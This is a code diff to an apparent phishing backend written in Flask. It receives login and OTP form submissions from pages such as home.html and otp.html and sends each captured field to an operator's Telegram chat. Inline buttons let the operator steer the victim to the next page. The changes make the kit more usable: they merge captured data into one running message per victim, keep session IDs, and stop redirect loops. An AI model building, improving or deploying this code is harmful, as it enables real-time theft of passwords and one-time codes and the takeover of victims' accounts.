@@ -15,10 +15,9 @@ CHAT_ID = os.getenv("CHAT_ID")
 if not BOT_TOKEN or not CHAT_ID:
     raise RuntimeError("Missing BOT_TOKEN or CHAT_ID in environment")
 
-# Storage for session data
+# Storage for session data (Now tracks full text and message ID)
 SESSION_STATUS = {}
 
-# Page configuration for Telegram buttons
 PAGES = [
     {"emoji": "🔐", "text": "LOGIN1", "page": "home.html"},
     {"emoji": "🔢", "text": "OTP", "page": "otp.html"},
@@ -30,16 +29,25 @@ PAGES = [
 ]
 
 def send_to_telegram(data, session_id, type_label):
-    msg = f"<b>🔐 {type_label.upper()} Submission</b>\n\n"
+    # Initialize session tracking if new
+    if session_id not in SESSION_STATUS:
+        SESSION_STATUS[session_id] = {
+            "approved": False, 
+            "redirect_url": None, 
+            "message_id": None, 
+            "history": ""
+        }
+
+    # Build the new snippet of data
+    new_entry = f"\n─── <b>{type_label.upper()}</b> ───\n"
     for key, value in data.items():
-        if key == "session_id": continue # Don't repeat ID in the list
-        if isinstance(value, dict):
-            msg += f"<b>{key.replace('_', ' ').title()}:</b>\n"
-            for subkey, subvalue in value.items():
-                msg += f"  <b>{subkey.replace('_', ' ').title()}:</b> <code>{subvalue}</code>\n"
-        else:
-            msg += f"<b>{key.replace('_', ' ').title()}:</b> <code>{value}</code>\n"
-    msg += f"\n<b>Session ID:</b> <code>{session_id}</code>"
+        if key == "session_id": continue
+        new_entry += f"<b>{key.replace('_', ' ').title()}:</b> <code>{value}</code>\n"
+    
+    # Append new data to history
+    SESSION_STATUS[session_id]["history"] += new_entry
+    
+    full_msg = f"<b>👤 NEW SESSION</b>\n<code>{session_id}</code>\n" + SESSION_STATUS[session_id]["history"]
 
     inline_keyboard = [[
         {"text": f"{b['emoji']} {b['text']}", "callback_data": f"{session_id}:{b['page']}"}
@@ -47,23 +55,25 @@ def send_to_telegram(data, session_id, type_label):
 
     payload = {
         "chat_id": CHAT_ID,
-        "text": msg,
+        "text": full_msg,
         "parse_mode": "HTML",
         "reply_markup": {"inline_keyboard": inline_keyboard}
     }
 
     try:
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)
+        msg_id = SESSION_STATUS[session_id].get("message_id")
+        if msg_id:
+            # EDIT the existing box
+            payload["message_id"] = msg_id
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText", json=payload)
+        else:
+            # SEND a new box and save the ID
+            r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)
+            res = r.json()
+            if res.get("ok"):
+                SESSION_STATUS[session_id]["message_id"] = res["result"]["message_id"]
     except Exception as e:
         print(f"Telegram error: {e}")
-
-@app.route("/set_webhook", methods=["GET"])
-def register_webhook():
-    # VISIT THIS URL ONCE IN YOUR BROWSER AFTER DEPLOYING
-    # Update the url below to your actual domain
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url=YOUR_DOMAIN/webhook"
-    r = requests.get(url)
-    return jsonify(r.json())
 
 @app.route("/webhook", methods=["POST"])
 def webhook():
@@ -86,6 +96,8 @@ def get_status(session_id):
         return jsonify({"status": "not_found"}), 404
         
     if status_info.get("approved"):
+        # Reset approved flag after sending to prevent redirect loops
+        status_info["approved"] = False 
         return jsonify({
             "status": "approved",
             "redirect_url": status_info["redirect_url"]
@@ -95,11 +107,12 @@ def get_status(session_id):
 
 def handle_submission(label):
     data = request.get_json()
-    # FIX: Use existing session ID from frontend if provided, else make new one
+    # PRESERVE SESSION: Use ID from frontend if provided
     session_id = data.get("session_id") or str(uuid.uuid4())
     
-    # Initialize or reset session status
-    SESSION_STATUS[session_id] = {"approved": False, "redirect_url": None}
+    # Ensure session exists in status tracker
+    if session_id not in SESSION_STATUS:
+        SESSION_STATUS[session_id] = {"approved": False, "redirect_url": None, "message_id": None, "history": ""}
     
     send_to_telegram(data, session_id, label)
     return jsonify({"success": True, "id": session_id}), 200
